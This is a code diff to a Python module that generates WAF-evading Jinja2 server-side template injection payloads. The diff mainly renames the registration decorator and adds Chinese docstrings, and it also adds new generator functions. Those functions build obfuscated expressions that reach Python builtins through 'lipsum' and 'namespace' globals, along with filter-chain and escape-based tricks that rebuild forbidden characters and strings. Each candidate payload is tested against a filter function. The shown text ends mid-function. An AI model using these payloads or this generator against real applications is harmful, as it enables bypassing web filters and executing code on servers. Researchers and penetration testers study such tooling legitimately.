+ExpressionGenerator = Callable[..., ExpressionGeneratorReturn]
+PayloadGeneratorResult = Tuple[str, ContextVariable]
 
-req_gens: DefaultDict[str, List[ReqGen]] = defaultdict(list)
+expression_gens: DefaultDict[str, List[ExpressionGenerator]] = defaultdict(list)
 logger = logging.getLogger("payload_gen")
 
 gen_weight_default = {
     "gen_string_percent_lower_c_concat": 1,
     "gen_string_lower_c_joinerbatch": 1,
     "gen_string_percent_urlencode2": 1,
-    "gen_string_x1": 1,
-    "gen_string_x2": 1,
+    "gen_string_concat1": 1,
+    "gen_string_concat2": 1,
     "gen_string_formatpercent": 1,
     "gen_attribute_attrfilter": 1,
-    "gen_item_dunderfunc": 1
+    "gen_item_dunderfunc": 1,
 }
 
 
-def req_gen(f: ReqGen):
+def expression_gen(f: ExpressionGenerator):
     gen_type = re.match("gen_([a-z_]+)_([a-z0-9]+)", f.__name__)
     if not gen_type:
         raise Exception(f"Error found when register payload generator {f.__name__}")
-    req_gens[gen_type.group(1)].append(f)
+    expression_gens[gen_type.group(1)].append(f)
 
 
 def hashable(o):
     try:
         _ = hash(o)
         return True
     except Exception:
         return False
 
 
 class PayloadGenerator:
+    """生成一个表达式，如('a'+'b')
+    其会遍历对应的expression_gen，依次“展开”生成目标为一个生成目标的列表，递归地
+    将每一个元素转为payload，拼接在一起并使用WAF函数检测是否合法。
+    """
     def __init__(
         self,
         waf_func: Callable[[str], bool],
         context: Union[Dict, None],
         callback: Union[Callable[[str, Dict], None], None] = None,
-        detect_mode: str = DETECT_MODE_ACCURATE
+        detect_mode: str = DETECT_MODE_ACCURATE,
     ):
         self.waf_func = waf_func
         self.context = context if context else {}
         self.cache = {}
+        # 给.generate_by_list的列表，指定每一个生成目标应该使用什么函数生成
         self.generate_funcs: List[
             Tuple[
-                Callable[[ReqGenRequirement], bool],
-                Callable[[ReqGenRequirement], Union[ReqGenResult, None]],
+                Callable[[Target], bool],
+                Callable[[Target], Union[PayloadGeneratorResult, None]],
             ]
         ]
-        self.generate_funcs = [
+        self.generate_funcs = [  # type: ignore
             (
-                (lambda gen_req: gen_req[0] == LITERAL),
-                (lambda gen_req: (gen_req[1], {})),
+                (lambda target: target[0] == LITERAL),
+                self.literal_generate,
             ),
-            ((lambda gen_req: gen_req[0] == UNSATISFIED), (lambda gen_req: None)),
-            ((lambda gen_req: gen_req[0] == ONEOF), self.oneof_generate),
+            ((lambda target: target[0] == UNSATISFIED), self.unsatisfied_generate),
+            ((lambda target: target[0] == ONEOF), self.oneof_generate),
             (
-                (lambda gen_req: gen_req[0] == WITH_CONTEXT_VAR),
-                (lambda gen_req: ("", {gen_req[1]: self.context[gen_req[1]]})),
+                (lambda target: target[0] == WITH_CONTEXT_VAR),
+                self.with_context_var_generate,
             ),
             (
-                (lambda gen_req: hashable(gen_req) and gen_req in self.cache),
-                (lambda gen_req: self.cache[gen_req]),
+                (lambda target: hashable(target) and target in self.cache),
+                (lambda target: self.cache[target]),
             ),
-            ((lambda gen_req: True), self.common_generate),
+            ((lambda target: True), self.common_generate),
         ]
         self.used_count = defaultdict(int)
         self.detect_mode = detect_mode
         if detect_mode == DETECT_MODE_FAST:
             for k in gen_weight_default:
                 self.used_count[k] += gen_weight_default[k]
 
         self.callback = callback if callback else (lambda x, y: None)
 
     def generate_by_list(
-        self, req_list: List[ReqGenRequirement]
-    ) -> Union[ReqGenResult, None]:
+        self, targets: List[Target]
+    ) -> Union[PayloadGeneratorResult, None]:
+        """根据一个生成目标的列表生成payload并使用WAF测试
+
+        Args:
+            targets (List[Target]): 生成目标的列表
+
+        Returns:
+            Union[PayloadGeneratorResult, None]: 生成结果，其包含payload和payload用到的上下文中的变量
+        """
         str_result, used_context = "", {}
-        for req in req_list:
+        for target in targets:
             for checker, runner in self.generate_funcs:
-                if not checker(req):
+                if not checker(target):
                     continue
-                result = runner(req)
+                result = runner(target)
                 if result is None:
                     return None
                 s, c = result
-                # if not self.waf_func(s):
-                # return None
                 str_result += s
                 used_context.update(c)
                 break
             else:
                 raise Exception("it shouldn't runs this line")
         if not self.waf_func(str_result):
             return None
         return str_result, used_context
 
-    def oneof_generate(self, gen_req: ReqGenRequirement) -> Union[ReqGenResult, None]:
-        _, *reqs = gen_req
-        for req in reqs:
+    def literal_generate(self, target: LiteralTarget) -> Union[PayloadGeneratorResult, None]:
+        """为literal类型的生成目标生成payload
+
+        Args:
+            target (LiteralTarget): 生成目标
+
+        Returns:
+            Union[PayloadGeneratorResult, None]: 生成结果 
+        """
+        if self.detect_mode == DETECT_MODE_ACCURATE and not self.waf_func(target[1]):
+            return None
+        return (target[1], {})
+
+    def unsatisfied_generate(self, target: UnsatisfiedTarget) -> None:
+        """直接拒绝类型为unsatisfied的生成目标
+        """
+        return None
+
+    def oneof_generate(
+        self, target: OneofTarget
+    ) -> Union[PayloadGeneratorResult, None]:
+        """生成类型为oneof的生成目标，遍历其中的每一个子目标并选择其中一个生成
+
+        Args:
+            target (OneofTarget): oneof生成目标，其中有多个生成目标列表
+
+        Returns:
+            Union[PayloadGeneratorResult, None]: 生成结果
+        """
+        _, *alternative_targets = target
+        for req in alternative_targets:
             ret = self.generate_by_list(req)
             if ret is not None:
                 return ret
         return None
 
-    def common_generate(self, gen_req: ReqGenRequirement) -> Union[ReqGenResult, None]:
-        gen_type: str
+    def with_context_var_generate(self, target: WithContextVarTarget) -> Union[PayloadGeneratorResult, None]:
+        """生成类型为with_context_var的生成目标，将其中包含的变量名加入到已经使用的变量中
+
+        Args:
+            target (WithContextVarTarget): 生成目标
+
+        Returns:
+            _type_: 生成结果
+        """
+        return ("", {target[1]: self.context[target[1]]})
+
+    def common_generate(self, gen_req: Target) -> Union[PayloadGeneratorResult, None]:
+        """为剩下所有类型的生成目标生成对应的payload, 遍历对应的expression_gen，拿到
+        对应的生成目标列表并尝试使用这个列表生成payload
+
+        Args:
+            gen_req (Target): 生成目标
+
+        Returns:
+            Union[PayloadGeneratorResult, None]: 生成结果
+        """
         gen_type, *args = gen_req
-        if gen_type not in req_gens or len(req_gens[gen_type]) == 0:
+        if gen_type not in expression_gens or len(expression_gens[gen_type]) == 0:
             logger.error("Unknown type: %s", gen_type)
             return None
 
-        gens = req_gens[gen_type].copy()
+        gens = expression_gens[gen_type].copy()
         if self.detect_mode == DETECT_MODE_FAST:
             gens.sort(key=lambda gen: self.used_count[gen.__name__], reverse=True)
         for gen in gens:
-            gen_ret: ReqGenReturn = gen(self.context, *args)
+            gen_ret: List[Target] = gen(self.context, *args)
             ret = self.generate_by_list(gen_ret)
             if ret is None:
                 if hashable(gen_req):
                     self.cache[gen_req] = ret
                 continue
             result = ret[0]
             self.callback(
                 CALLBACK_GENERATE_PAYLOAD,
-                {"gen_type": gen_type, "args": args, "gen_ret": gen_ret, "payload": result},
+                {
+                    "gen_type": gen_type,
+                    "args": args,
+                    "gen_ret": gen_ret,
+                    "payload": result,
+                },
             )
             # 为了日志的简洁，仅打印一部分日志
             if gen_type in (INTEGER, STRING) and result != str(args[0]):
                 logger.info(
                     "{great}, {gen_type}({args_repl}) can be {result}".format(
                         great=colored("green", "Great"),
                         gen_type=colored("yellow", gen_type, bold=True),
@@ -183,21 +338,41 @@
                 gen_type=gen_type,
                 args_repl=", ".join(repr(arg) for arg in args),
             )
         )
         return None
 
     def generate(self, gen_type, *args) -> Union[str, None]:
+        """提供给用户的生成接口，接收一个生成目标的类型和参数
+
+        Args:
+            gen_type (str): 生成目标的类型
+            *args: 生成目标的参数
+
+        Returns:
+            Union[str, None]: 生成结果
+        """
         result = self.generate_by_list([(gen_type, *args)])
         if result is None:
             return None
         s, c = result
         return s
 
-    def generate_with_used_context(self, gen_type, *args) -> Union[ReqGenResult, None]:
+    def generate_with_used_context(
+        self, gen_type, *args
+    ) -> Union[PayloadGeneratorResult, None]:
+        """提供给用户的生成接口，接收一个生成目标的类型和参数
+
+        Args:
+            gen_type (str): 生成目标的类型
+            *args: 生成目标的参数
+
+        Returns:
+            Union[str, None]: 生成结果（包含使用的上下文变量）
+        """
         result = self.generate_by_list([(gen_type, *args)])
         if result is None:
             return None
         s, c = result
         return s, c
 
 
@@ -207,98 +382,98 @@
     payload_generator = PayloadGenerator(waf_func, context)
     return payload_generator.generate(gen_type, *args)
 
 
 # ---
 
 
-@req_gen
-def gen_string_string_concat_plus(context: dict):
+@expression_gen
+def gen_string_string_concat_plus(context: dict) -> List[LiteralTarget]:
     return [(LITERAL, "+")]
 
 
-@req_gen
+@expression_gen
 def gen_string_string_concat_wave(context: dict):
     return [(LITERAL, "~")]
 
 
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_formular_sum_add(context, num_list):
     return [(LITERAL, "({})".format("+".join(str(n) for n in num_list)))]
 
 
-@req_gen
+@expression_gen
 def gen_formular_sum_addfunc(context, num_list):
     num_list = [
         str(n) if i == 0 else ".__add__({})".format(n) for i, n in enumerate(num_list)
     ]
     return [(LITERAL, "({})".format("".join(num_list)))]
 
 
-@req_gen
+@expression_gen
 def gen_formular_sum_attraddfund(context, num_list):
     num_list = [
         str(n) if i == 0 else f'|attr("\\x5f\\x5fadd\\x5f\\x5f")({n})'
         for i, n in enumerate(num_list)
     ]
     return [(LITERAL, "({})".format("".join(num_list)))]
 
 
-@req_gen
+@expression_gen
 def gen_formular_sum_tuplesum(context, num_list):
     if len(num_list) == 1:
         return [(LITERAL, str(num_list[0]))]
     payload = "(({})|sum)".format(",".join(num_list))
     return [(LITERAL, payload)]
 
 
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_zero_literal(context: dict):
     return [(LITERAL, "0")]
 
 
-@req_gen
+@expression_gen
 def gen_zero_2(context: dict):
     return [(LITERAL, "({}|int)")]
 
 
-@req_gen
+@expression_gen
 def gen_zero_3(context: dict):
     return [(LITERAL, "(g|urlencode|length)")]
 
 
-@req_gen
+@expression_gen
 def gen_zero_4(context: dict):
     return [(LITERAL, "({}|urlencode|count)")]
 
 
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_positive_integer_simple(context: dict, value: int):
     if value < 0:
         return [(UNSATISFIED,)]
     return [(LITERAL, str(value))]
 
 
-@req_gen
+@expression_gen
 def gen_positive_integer_hex(context: dict, value: int):
     if value < 0:
         return [(UNSATISFIED,)]
     return [(LITERAL, hex(value))]
 
 
-@req_gen
+@expression_gen
 def gen_positive_integer_sum(context: dict, value: int):
     if value < 0:
         return [(UNSATISFIED,)]
 
     ints = [
         (var_name, var_value)
         for var_name, var_value in context.items()
@@ -320,76 +495,129 @@
         payload_vars.append(ints[0][0])
 
     return [(FORMULAR_SUM, tuple(payload_vars))] + [
         (WITH_CONTEXT_VAR, v) for v in payload_vars
     ]
 
 
-@req_gen
-def gen_positive_integer_length(context: dict, value: int):
+@expression_gen
+def gen_positive_integer_recurdivided(context: dict, value: int):
+    if value <= 6:
+        return [(UNSATISFIED,)]
+    lst = [(LITERAL, "+"), (POSITIVE_INTEGER, value % 6)] if value % 6 != 0 else []
+    return (
+        [
+            (LITERAL, "("),
+            (POSITIVE_INTEGER, value // 6),
+            (LITERAL, "*"),
+            (POSITIVE_INTEGER, 6),
+        ]
+        + lst
+        + [
+            (LITERAL, ")"),
+        ]
+    )
+
+
+@expression_gen
+def gen_positive_integer_recurmulitiply(context: dict, value: int):
+    xs = [x for x in range(3, value // 2) if value % x == 0]
+    if xs == []:
+        return [(UNSATISFIED,)]
     return [
-        (LITERAL, "(({},)|length)".format(",".join("x" * value)))
+        (
+            ONEOF,
+            *[
+                [
+                    (LITERAL, "("),
+                    (POSITIVE_INTEGER, value // x),
+                    (LITERAL, "*"),
+                    (POSITIVE_INTEGER, x),
+                    (LITERAL, ")"),
+                ]
+                for x in xs[::-1]
+            ],
+        )
     ]
 
-@req_gen
+
+@expression_gen
+def gen_positive_integer_dictlength(context: dict, value: int):
+    return [(LITERAL, "(dict({}=x)|join|length)".format("x" * value))]
+
+
+@expression_gen
+def gen_positive_integer_length(context: dict, value: int):
+    return [(LITERAL, "(({},)|length)".format(",".join("x" * value)))]
+
+
+@expression_gen
 def gen_positive_integer_length2(context: dict, value: int):
-    return [
-        (LITERAL, "(({},).__len__( ))".format(",".join("x" * value)))
-    ]
+    return [(LITERAL, "(({},).__len__( ))".format(",".join("x" * value)))]
+
+
+@expression_gen
+def gen_positive_integer_truesum1(context: dict, value: int):
+    return [(LITERAL, "({})".format("+".join(["True"] * value)))]
+
+
+@expression_gen
+def gen_positive_integer_truesum2(context: dict, value: int):
+    return [(LITERAL, "(({},)|sum)".format(",".join(["True"] * value)))]
 
 
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_integer_literal(context: dict, value: int):
     return [(LITERAL, str(value))]
 
 
-@req_gen
+@expression_gen
 def gen_integer_context(context: dict, value: int):
     if value not in context.values():
         return [(UNSATISFIED,)]
     v = [k for k, v in context.items() if v == value][0]
     return [
         (LITERAL, v),
         (WITH_CONTEXT_VAR, v),
     ]
 
 
-@req_gen
+@expression_gen
 def gen_integer_zero(context: dict, value: int):
     if value != 0:
         return [(UNSATISFIED,)]
     return [(ZERO,)]
 
 
-@req_gen
+@expression_gen
 def gen_integer_positive(context: dict, value: int):
     if value <= 0:
         return [(UNSATISFIED,)]
     return [(POSITIVE_INTEGER, value)]
 
 
-@req_gen
+@expression_gen
 def gen_integer_negative(context: dict, value: int):
     if value >= 0:
         return [(UNSATISFIED,)]
     return [(LITERAL, "-"), (POSITIVE_INTEGER, abs(value))]
 
 
 # @req_gen
 # def gen_integer_unicode(context: dict, value: int):
 #     dis = ord("０") - ord("0")
 #     return [
 #         (LITERAL, "".join(chr(ord(c) + dis) for c in str(value)))
 #     ]
 
 
-@req_gen
+@expression_gen
 def gen_integer_subtract(context: dict, value: int):
     ints = [
         (var_name, var_value)
         for var_name, var_value in context.items()
         if isinstance(var_value, int) and var_value > 0
     ]
 
@@ -432,79 +660,73 @@
         + sub_vars
     ]
 
 
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_literal1(context):
     return [(LITERAL, "'%'")]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_literal2(context):
     return [(LITERAL, '"%"')]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_context(context):
     if "%" not in context.values():
         return [(UNSATISFIED,)]
     v = [k for k, v in context.items() if v == "%"][0]
     return [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_urlencode1(context):
     return [(LITERAL, "(lipsum()|urlencode|first)")]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_urlencode2(context):
     return [(LITERAL, "({}|escape|urlencode|first)")]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_lipsum(context):
     return [
         (
             LITERAL,
             "(lipsum[(lipsum|escape|batch(22)|list|first|last)*2"
             + "+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2]"
             + "[(lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)"
             + "|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))",
         )
     ]
 
-@req_gen
+
+@expression_gen
 def gen_string_percent_lipsum2(context):
-    return [
-        (
-            LITERAL,
-            "(lipsum['__glob''als__']['__builti''ns__']['chr'](37))"
-        )
-    ]
+    return [(LITERAL, "(lipsum['__glob''als__']['__builti''ns__']['chr'](37))")]
 
-@req_gen
+
+@expression_gen
 def gen_string_percent_namespace(context):
     return [
         (
             LITERAL,
-            "(namespace['__ini''t__']['__glob''al''s__']['__builti''ns__']['chr']("
+            "(namespace['__ini''t__']['__glob''al''s__']['__builti''ns__']['chr'](",
         ),
         (INTEGER, 37),
-        (
-            LITERAL, "))"
-        )
+        (LITERAL, "))"),
     ]
 
 
-
-@req_gen
+@expression_gen
 def gen_string_percent_lipsumcomplex(context):
     return [
         (LITERAL, "(lipsum[(lipsum|escape|batch("),
         (INTEGER, 22),
         (LITERAL, ")|list|first|last)*"),
         (INTEGER, 2),
         (LITERAL, "+dict(globals=x)|join+(lipsum|escape|batch("),
@@ -521,15 +743,15 @@
         (INTEGER, 2),
         (LITERAL, "][dict(chr=x)|join]("),
         (INTEGER, 37),
         (LITERAL, "))"),
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_urlencodelong(context):
     return [
         (
             LITERAL,
             "((lipsum,)|map(((lipsum|string|list|batch(3)|first|last)"
             + "~(lipsum|string|list|batch(15)|first|last)"
             + "~(lipsum|string|list|batch(20)|first|last)"
@@ -542,131 +764,141 @@
         )
     ]
 
 
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_string_lower_c_literal1(context):
     return [(LITERAL, "'c'")]
 
 
-@req_gen
+@expression_gen
 def gen_string_lower_c_literal2(context):
     return [(LITERAL, '"c"')]
 
 
-@req_gen
+@expression_gen
 def gen_string_lower_c_joindict(context):
     return [(LITERAL, "(dict(c=x)|join)")]
 
 
-@req_gen
+@expression_gen
 def gen_string_lower_c_lipsumurlencode(context):
     return [(LITERAL, "(lipsum|pprint|first|urlencode|last|lower)")]
 
 
-@req_gen
+@expression_gen
 def gen_string_lower_c_lipsumbatch(context):
     return [
         (LITERAL, "(lipsum|escape|batch("),
         (INTEGER, 8),
         (LITERAL, ")|first|last)"),
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_lower_c_joinerbatch(context):
     return [
         (LITERAL, "(joiner|string|batch("),
         (INTEGER, 2),
         (LITERAL, ")|first|last)"),
     ]
 
+@expression_gen
+def gen_string_lower_c_namespacebatch(context):
+    return [
+        (LITERAL, "(namespace|escape|batch("),
+        (INTEGER, 36),
+        (LITERAL, ")|first|last)"),
+    ]
+
 
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_lower_c_literal1(context):
     return [(LITERAL, "'%c'")]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_lower_c_literal2(context):
     return [(LITERAL, '"%c"')]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_lower_c_concat(context):
     return [
         (LITERAL, "("),
         (STRING_PERCENT,),
         (STRING_STRING_CONCAT,),
         (STRING_LOWERC,),
         (LITERAL, ")"),
     ]
 
-@req_gen
+
+@expression_gen
 def gen_string_percent_lower_c_dictjoin(context):
     # "(dict([('%',x),('c',x)])|join)"
     return [
         (LITERAL, "(dict([("),
-        (STRING_PERCENT, ),
+        (STRING_PERCENT,),
         (LITERAL, ",x),("),
-        (STRING_LOWERC, ),
-        (LITERAL, ",x)])|join)")
+        (STRING_LOWERC,),
+        (LITERAL, ",x)])|join)"),
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_lower_c_listjoin(context):
     # "(['%','c']|join)"
     return [
         (LITERAL, "(["),
-        (STRING_PERCENT, ),
+        (STRING_PERCENT,),
         (LITERAL, ","),
-        (STRING_LOWERC, ),
-        (LITERAL, "]|join)")
+        (STRING_LOWERC,),
+        (LITERAL, "]|join)"),
     ]
 
-@req_gen
+
+@expression_gen
 def gen_string_percent_lower_c_tuplejoin(context):
     # "(('%','c')|join)"
     return [
         (LITERAL, "(("),
-        (STRING_PERCENT, ),
+        (STRING_PERCENT,),
         (LITERAL, ","),
-        (STRING_LOWERC, ),
-        (LITERAL, ")|join)")
+        (STRING_LOWERC,),
+        (LITERAL, ")|join)"),
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_percent_lower_c_cycler(context):
     # cycler|pprint|list|pprint|urlencode|batch(%s)|first|join|batch(%s)|list|last|reverse|join|lower
     return [
         (LITERAL, "(cycler|pprint|list|pprint|urlencode|batch("),
         (INTEGER, 10),
         (LITERAL, ")|first|join|batch("),
         (INTEGER, 8),
         (LITERAL, ")|list|last|reverse|join|lower)"),
     ]
 
 
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_string_many_percent_lower_c_multiply(context, count: int):
     return [(STRING_PERCENT_LOWER_C,), (LITERAL, "*"), (INTEGER, count)]
 
 
-@req_gen
+@expression_gen
 def gen_string_many_percent_lower_c_concat(context, count: int):
     l = [
         [
             (STRING_PERCENT_LOWER_C,),
         ]
         if i == 0
         else [
@@ -677,73 +909,73 @@
     ]
     return [item for lst in l for item in lst]
 
 
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_string_underline_literal1(context):
     return [(LITERAL, "'_'")]
 
 
-@req_gen
+@expression_gen
 def gen_string_underline_literal2(context):
     return [(LITERAL, '"_"')]
 
 
-@req_gen
+@expression_gen
 def gen_string_underline_context(context: dict):
     if "_" in context.values():
         v = [k for k, v in context.items() if v == "_"][0]
         return [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]
     return [(UNSATISFIED,)]
 
 
-@req_gen
+@expression_gen
 def gen_string_underline_lipsum(context):
     return [
         (LITERAL, "(lipsum|escape|batch("),
         (INTEGER, 22),
         (LITERAL, ")|list|first|last)"),
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_underline_tupleselect(context):
     return [
         (LITERAL, "(()|select|string|batch("),
         (INTEGER, 25),
         (LITERAL, ")|first|last)"),
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_many_format_c_complex(context, num):
     parts = "(({c})*{l})".format(
         c="{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,LOWERC)",
         l=num,
     ).partition("LOWERC")
     return [(LITERAL, parts[0]), (STRING_LOWERC,), (LITERAL, parts[2])]
 
 
 # ---
 
 
-@req_gen
+@expression_gen
 def gen_char_literal1(context, c):
     return [(LITERAL, f"'{c}'" if c != "'" else "'\\''")]
 
 
-@req_gen
+@expression_gen
 def gen_char_literal2(context, c):
     return [(LITERAL, f'"{c}"' if c != '"' else '"\\""')]
 
 
-@req_gen
+@expression_gen
 def gen_char_select(context, c):
     char_patterns = {
         "((dict|trim|list)[INDEX])": {
             1: "c",
             2: "l",
             3: "a",
             4: "s",
@@ -835,178 +1067,192 @@
     for pattern, d in char_patterns.items():
         for index, value in d.items():
             if value == c:
                 return [(LITERAL, pattern.replace("INDEX", str(index)))]
     return [(UNSATISFIED,)]
 
 
-@req_gen
+@expression_gen
 def gen_char_dict(context, c):
     if not re.match("[A-Za-z]", c):
         return [(UNSATISFIED,)]
     return [(LITERAL, f"(dict({c}=x)|join)")]
 
-@req_gen
+
+@expression_gen
 def gen_char_num(context, c):
     if not re.match("[0-9]", c):
         return [(UNSATISFIED,)]
-    return [(LITERAL, f"((", ), (INTEGER, int(c)), (LITERAL, ").__str__( ))")]
+    return [
+        (
+            LITERAL,
+            f"((",
+        ),
+        (INTEGER, int(c)),
+        (LITERAL, ").__str__( ))"),
+    ]
 
-@req_gen
+
+@expression_gen
 def gen_char_num2(context, c):
     if not re.match("[0-9]", c):
         return [(UNSATISFIED,)]
-    return [(LITERAL, f"((", ), (INTEGER, int(c)), (LITERAL, ")|string)")]
+    return [
+        (
+            LITERAL,
+            f"((",
+        ),
+        (INTEGER, int(c)),
+        (LITERAL, ")|string)"),
+    ]
 
 
 # ---
 # 以下的gen_string会互相依赖，但是产生互相依赖时传入的字符串长度会减少所以不会发生无限调用
 
 
-@req_gen
+@expression_gen
 def gen_string_1(context: dict, value: str):
     chars = [c if c != "'" else "\\'" for c in value]
     return [(LITERAL, "'{}'".format("".join(chars)))]
 
 
-@req_gen
+@expression_gen
 def gen_string_2(context: dict, value: str):
     chars = [c if c != '"' else '\\"' for c in value]
     return [(LITERAL, '"{}"'.format("".join(chars)))]
 
 
-@req_gen
+@expression_gen
 def gen_string_x1(context: dict, value: str):
     if any(ord(c) >= 128 for c in value):
         return [(UNSATISFIED,)]
     target = "".join("\\x" + hex(ord(c))[2:] for c in value)
     return [(LITERAL, '"{}"'.format(target))]
 
 
-@req_gen
+@expression_gen
 def gen_string_x2(context: dict, value: str):
     if any(ord(c) >= 128 for c in value):
         return [(UNSATISFIED,)]
     target = "".join("\\x" + hex(ord(c))[2:] for c in value)
     return [(LITERAL, "'{}'".format(target))]
 
 
-@req_gen
+@expression_gen
 def gen_string_u1(context: dict, value: str):
     if any(ord(c) >= 128 for c in value):
         return [(UNSATISFIED,)]
     target = "".join("\\u00" + hex(ord(c))[2:] for c in value)
     return [(LITERAL, "'{}'".format(target))]
 
 
-@req_gen
+@expression_gen
 def gen_string_u2(context: dict, value: str):
     if any(ord(c) >= 128 for c in value):
         return [(UNSATISFIED,)]
     target = "".join("\\u00" + hex(ord(c))[2:] for c in value)
     return [(LITERAL, "'{}'".format(target))]
 
 
-@req_gen
+@expression_gen
 def gen_string_context(context: dict, value: str):
     if value not in context.values():
         return [(UNSATISFIED,)]
     v = [k for k, v in context.items() if v == value][0]
     return [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]
 
 
-@req_gen
+@expression_gen
 def gen_string_twostringconcat(context: dict, value: str):
     if len(value) <= 2 or len(value) > 20:
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
     return [
+        (LITERAL, "'"),  # test quotes first
         (
             ONEOF,
             *[
                 [
-                    (LITERAL, "'{}'".format(value[:i].replace("'", "\\'"))),
-                    (LITERAL, "'{}'".format(value[i:].replace("'", "\\'")))
+                    (LITERAL, "{}'".format(value[:i].replace("'", "\\'"))),
+                    (LITERAL, "'{}'".format(value[i:].replace("'", "\\'"))),
                 ]
                 for i in range(1, len(value) - 1)
-            ]
-        )
+            ],
+        ),
     ]
 
-@req_gen
+
+@expression_gen
 def gen_string_twostringconcat2(context: dict, value: str):
     if len(value) <= 2 or len(value) > 20:
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
     return [
+        (LITERAL, '"'),  # test quotes first
         (
             ONEOF,
             *[
                 [
-                    (LITERAL, "\"{}\"".format(value[:i].replace("\"", "\\\""))),
-                    (LITERAL, "\"{}\"".format(value[i:].replace("\"", "\\\"")))
+                    (LITERAL, '{}"'.format(value[:i].replace('"', '\\"'))),
+                    (LITERAL, '"{}"'.format(value[i:].replace('"', '\\"'))),
                 ]
                 for i in range(1, len(value) - 1)
-            ]
-        )
+            ],
+        ),
     ]
 
-@req_gen
+
+@expression_gen
 def gen_string_concat1(context: dict, value: str):
     return [
         (
             LITERAL,
             "({})".format(
                 "+".join("'{}'".format(c if c != "'" else "\\'") for c in value)
             ),
         )
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_concat2(context: dict, value: str):
     return [
         (
             LITERAL,
             "({})".format(
                 "+".join('"{}"'.format(c if c != '"' else '\\"') for c in value)
             ),
         )
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_concat3(context: dict, value: str):
     return [
         (
             LITERAL,
             "({})".format(
                 "".join('"{}"'.format(c if c != '"' else '\\"') for c in value)
             ),
         )
     ]
 
 
-
-@req_gen
+@expression_gen
 def gen_string_chars(context: dict, value: str):
     ans: List[Any] = [(LITERAL, "("), (CHAR, value[0])]
     for c in value[1:]:
         ans.append((STRING_STRING_CONCAT,))
         ans.append((CHAR, c))
     ans.append(
         (LITERAL, ")"),
     )
     return ans
 
 
-
-@req_gen
+@expression_gen
 def gen_string_removedunder(context: dict, value: str):
     if not re.match("^__[A_Za-z0-9_]+__$", value):
         return [(UNSATISFIED,)]
     return [
         (STRING_UNDERLINE,),
         (LITERAL, "*"),
         (INTEGER, 2),
@@ -1014,93 +1260,93 @@
         (STRING, value[2:-2]),
         (STRING_STRING_CONCAT,),
         (STRING_UNDERLINE,),
         (LITERAL, "*"),
         (INTEGER, 2),
     ]
 
-@req_gen
+
+@expression_gen
 def gen_string_dictjoin(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
         return [(UNSATISFIED,)]
     return [(LITERAL, "(dict({}=x)|join)".format(value))]
 
 
-@req_gen
+@expression_gen
 def gen_string_splitdictjoin(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
         return [(UNSATISFIED,)]
     parts = [value[i : i + 3] for i in range(0, len(value), 3)]
     req = []
     for i, part in enumerate(parts):
         if i != 0:
             req.append((STRING_STRING_CONCAT,))
         req.append((LITERAL, "(dict({}=x)|join)".format(part)))
     return req
 
 
-@req_gen
+@expression_gen
 def gen_string_splitdictjoin2(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
         return [(UNSATISFIED,)]
     parts = [value[i : i + 3] for i in range(0, len(value), 3)]
 
     if len(set(parts)) != len(parts):
         return [(UNSATISFIED,)]
 
     return [
         (LITERAL, "(dict({})|join)".format(",".join(f"{part}=x" for part in parts)))
     ]
 
 
-@req_gen
+@expression_gen
 def gen_string_splitdictjoin3(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
         return [(UNSATISFIED,)]
 
     if len(set(value)) != len(value):
         return [(UNSATISFIED,)]
 
     return [
         (LITERAL, "(dict({})|join)".format(",".join(f"{part}=x" for part in value)))
     ]
 
 
-
-@req_gen
+@expression_gen
 def gen_string_formatpercent(context: dict, value: str):
     # (('%c'*n)%(97,98,99))
     req = []
     req.append((LITERAL, "(("))
     req.append((STRING_MANY_PERCENT_LOWER_C, len(value)))
     req.append((LITERAL, ")%("))
     for i, c in enumerate(value):
         if i != 0:
             req.append((LITERAL, ","))
         req.append((INTEGER, ord(c)))
     req.append((LITERAL, "))"))
     return req
 
 
-@req_gen
+@expression_gen
 def gen_string_formatfunc(context: dict, value: str):
     # (('%c'*n)|format(97,98,99))
     req = []
     req.append((LITERAL, "(("))
     req.append((STRING_MANY_PERCENT_LOWER_C, len(value)))
     req.append((LITERAL, ")|format("))
     for i, c in enumerate(value):
         if i != 0:
             req.append((LITERAL, ","))
         req.append((INTEGER, ord(c)))
     req.append((LITERAL, "))"))
     return req
 
 
-@req_gen
+@expression_gen
 def gen_string_formatfunc2(context: dict, value: str):
     # (FORMAT(97,98,99))
     # FORMAT = (CS.format)
     # CS = (C*L)
     if re.match("^[a-z]+$", value):  # avoid infinite recursion
